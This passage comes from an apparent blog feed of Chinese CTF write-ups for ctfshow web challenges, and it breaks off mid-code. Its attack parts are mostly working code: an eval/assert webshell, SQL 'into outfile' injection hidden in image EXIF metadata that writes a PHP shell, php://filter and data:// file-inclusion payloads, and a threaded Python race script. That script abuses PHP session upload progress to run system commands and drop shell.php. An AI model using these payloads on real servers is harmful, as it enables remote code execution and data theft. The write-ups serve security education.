punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre><span class=\"token variable\">$uncompressed</span> <span class=\"token operator\">=</span> <span class=\"token function\">gzuncompress</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$decrypted</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre><span class=\"token comment\">// 由于可以不勾选代码压缩的选项，所以这里判断一下是否解压成功，解压失败就是没压缩</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$uncompressed</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>    <span class=\"token variable\">$decrypted</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_rot13</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$uncompressed</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre><span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>    <span class=\"token variable\">$decrypted</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_rot13</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$decrypted</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre><span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$output_file</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$decrypted</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'解密后文件已写入到 '</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$output_file</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">PHP_EOL</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>用法：  <code>php 该解密脚本 待解密的php文件</code>  ，得到：</p>\n<p><code>@assert($_POST[6]);</code>  为一句话木马，蚁剑登陆，连接类型选择 base64</p>\n<h2 id=\"你没见过的注入\"><a class=\"anchor\" href=\"#你没见过的注入\">#</a> 你没见过的注入</h2>\n<p>根据提示查看 txt 文件，那么必然是 robots.txt，输入后可以看到 /pwreset.php ，进入为密码重置页面，重置密码为 1，登录，发现为文件上传页面</p>\n<p>尝试性地上传 txt，jpg 文件，可以看到文件被打包成 zip 文件，并在后面跟上 filetype 的判断</p>\n<p>搜索资料，发现为文件类型注入，通过修改图片的 type 来完成注入</p>\n<p>可以猜测语句是 <code>insert into file values (“filename”,“filetype”,“fileextra”)</code> ，没有作任何过滤，可以写一句话进去</p>\n<p>一般写成 16 进制形式，避免语句本身的单引号双引号对拼接造成干扰</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> <span class=\"token string\">\"&lt;?=`$_POST[1]`;\"</span> <span class=\"token keyword\">into</span> <span class=\"token keyword\">outfile</span> <span class=\"token string\">\"/var/www/html/1.php\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">select</span> <span class=\"token number\">0x003c3f3d60245f504f53545b315d603b</span> <span class=\"token keyword\">into</span> <span class=\"token keyword\">outfile</span> <span class=\"token string\">\"/var/www/html/1.php\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># 其他 eval 应该过滤了，多次上传没有成功</span></pre></td></tr></table></figure><p>使用 exiftool 工具</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>exiftool <span class=\"token parameter variable\">-overwrite_original</span> <span class=\"token parameter variable\">-comment</span><span class=\"token operator\">=</span><span class=\"token string\">\"zhong<span class=\"token entity\" title=\"\\&quot;\">\\\"</span>');select 0x3c3f3d60245f504f53545b315d603b into outfile <span class=\"token entity\" title=\"\\&quot;\">\\\"</span>/var/www/html/1.php<span class=\"token entity\" title=\"\\&quot;\">\\\"</span>;\"</span> <span class=\"token number\">1</span>.jpg</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># 分号前面为闭合前面语句</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># 其中 1.jpg 的大小要尽可能的小</span></pre></td></tr></table></figure><p>上传后，访问 1.php。分别输入</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>1&#x3D;ls</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>1&#x3D;ls &#x2F;</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>1&#x3D;cat &#x2F;flag</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>得到 flag</pre></td></tr></table></figure>",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.github.io/2022/10/04/CTF/ctfshow/36D%E6%9D%AF%E7%BB%83%E6%89%8B%E8%B5%9B/",
            "url": "http://dpm12345.github.io/2022/10/04/CTF/ctfshow/36D%E6%9D%AF%E7%BB%83%E6%89%8B%E8%B5%9B/",
            "title": "36D杯练手赛",
            "date_published": "2022-10-04T15:20:32.000Z",
            "content_html": "<h1 id=\"web\"><a class=\"anchor\" href=\"#web\">#</a> Web</h1>\n<h2 id=\"easy-shell\"><a class=\"anchor\" href=\"#easy-shell\">#</a> easy shell</h2>\n<p>进入后查看源码，看到注释 <code>&lt;!--md5($secret.$name)===$pass --&gt;</code></p>\n<p>先随便输入，发现 cookie 中有 hash 值 <code>de73312423b835b22bfdc3c6da7b63e9</code> ，猜测为满足条件的 md5 值</p>\n<p>于是将该值赋给 pass，提交后发现为 404，但是此时仔细发现，该页面是一个 404.html，于是推测发生了重定向</p>\n<p>尝试 bp 抓包，得到</p>\n<p><img data-src=\"/%E7%B4%A0%E6%9D%90/%E5%9B%BE%E7%89%87/36Deasy_shell_1.jpg\" alt=\"\" /></p>\n<p>发现  <code>flflflflag.php</code>  文件，抓包访问，得到</p>\n<p><img data-src=\"/%E7%B4%A0%E6%9D%90/%E5%9B%BE%E7%89%87/36Deasy_shell_2.jpg\" alt=\"\" /></p>\n<p>发现文件包含，尝试使用伪协议</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flflflflag.php</pre></td></tr></table></figure><p>base64 解码后得到</p>\n<p>index.php</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">include</span> <span class=\"token string single-quoted-string\">'config.php'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>@<span class=\"token variable\">$name</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>@<span class=\"token variable\">$pass</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pass'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$secret</span><span class=\"token operator\">.</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token variable\">$pass</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;script language=\"javascript\" type=\"text/javascript\"></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>           window.location.href=\"flflflflag.php\";</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t&lt;/script></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token function\">setcookie</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Hash\"</span><span class=\"token punctuation\">,</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$secret</span><span class=\"token operator\">.</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token function\">time</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">3600000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"username/password error\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\">&lt;!--md5($secret.$name)===$pass --></span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>flflflflag.php</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">language</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>javascript<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text/javascript<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>           window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>href<span class=\"token operator\">=</span><span class=\"token string\">\"404.html\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>yesec want Girl friend<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>&lt;></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token variable\">$file</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/data|input|zip/is'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t<span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'nonono'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>@<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'include($_GET[\"file\"])'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>尝试 session 文件包含</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> io</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> threading</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>host <span class=\"token operator\">=</span> <span class=\"token string\">'http://5d6bb0b0-e82d-4a68-b50b-8fd858a7c6ea.chall.ctf.show/flflflflag.php'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>sessid <span class=\"token operator\">=</span> <span class=\"token string\">'vrhtvjd4j1sd88onr92fm9t2sj'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">POST</span><span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        f <span class=\"token operator\">=</span> io<span class=\"token punctuation\">.</span>BytesIO<span class=\"token punctuation\">(</span><span class=\"token string\">b'a'</span> <span class=\"token operator\">*</span> <span class=\"token number\">1024</span> <span class=\"token operator\">*</span> <span class=\"token number\">50</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        session<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            host<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            data<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"PHP_SESSION_UPLOAD_PROGRESS\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;?php system('cat *');fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[cmd])?>');echo md5('1');?>\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            files<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"file\"</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">(</span><span class=\"token string\">'a.txt'</span><span class=\"token punctuation\">,</span> f<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            cookies<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">'PHPSESSID'</span><span class=\"token punctuation\">:</span>sessid<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">READ</span><span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        response <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>host<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">?file=/tmp/sess_</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>sessid<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token comment\"># print(response.text)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">'c4ca4238a0b923820dcc509a6f75849b'</span> <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span> response<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token comment\"># if 'flag' not in response.text:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'[+++]retry'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>response<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>            sys<span class=\"token punctuation\">.</span>exit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token keyword\">with</span> requests<span class=\"token punctuation\">.</span>session<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> session<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    t1 <span class=\"token operator\">=</span> threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>POST<span class=\"token punctuation\">,</span> args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    t1<span class=\"token punctuation\">.</span>daemon <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    t1<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    READ<span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.github.io/2022/10/04/CTF/ctfshow/%E5%8D%95%E8%BA%AB%E6%9D%AF/",
            "url": "http://dpm12345.github.io/2022/10/04/CTF/ctfshow/%E5%8D%95%E8%BA%AB%E6%9D%AF/",
            "title": "单身杯",
            "date_published": "2022-10-04T15:10:32.000Z",
            "content_html": "<h1 id=\"misc\"><a class=\"anchor\" href=\"#misc\">#</a> Misc</h1>\n<h2 id=\"没大没小的串串\"><a class=\"anchor\" href=\"#没大没小的串串\">#</a> 没大没小的串串</h2>\n<p>爆破即可</p>\n<h1 id=\"web\"><a class=\"anchor\" href=\"#web\">#</a> Web</h1>\n<h2 id=\"web-签到\"><a class=\"anchor\" href=\"#web-签到\">#</a> web 签到</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># -*- coding: utf-8 -*-</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># @Author: h1xa</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># @Date:   2022-03-19 12:10:55</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># @Last Modified by:   h1xa</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># @Last Modified time: 2022-03-19 13:27:18</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># @email: h1xa@ctfer.com</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># @link: https://ctfer.com</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">strrev</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">include</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>主要是字符串的反转 可利用 data 伪协议， <code>?&gt;</code>  后可加任意字符，故 payload</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php eval($_POST[1]);?&gt;&gt;?;)]1[TSOP_$(lave php?&lt;,nialp&#x2F;txet&#x2F;&#x2F;:atad&amp;1&#x3D;system(&quot;cat &#x2F;f1agaaa&quot;);</pre></td></tr></table></figure><h2 id=\"easyphp\"><a class=\"anchor\" href=\"#easyphp\">#</a> easyPHP</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># -*- coding: utf-8 -*-</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># @Author: h1xa</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># @Date:   2022-03-19 12:10:55</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># @Last Modified by:   h1xa</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># @Last Modified time: 2022-03-19 13:27:18</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># @email: h1xa@ctfer.com</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># @link: https://ctfer.com</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token variable\">$cmd</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token variable\">$param</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'param'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$cmd</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$param</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token variable\">$cmd</span><span class=\"token operator\">=</span><span class=\"token function\">escapeshellcmd</span><span class=\"token punctuation\">(</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$cmd</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\" \"</span><span class=\"token operator\">.</span><span class=\"token function\">escapeshellarg</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$param</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\" \"</span><span class=\"token operator\">.</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token function\">shell_exec</span><span class=\"token punctuation\">(</span><span class=\"token 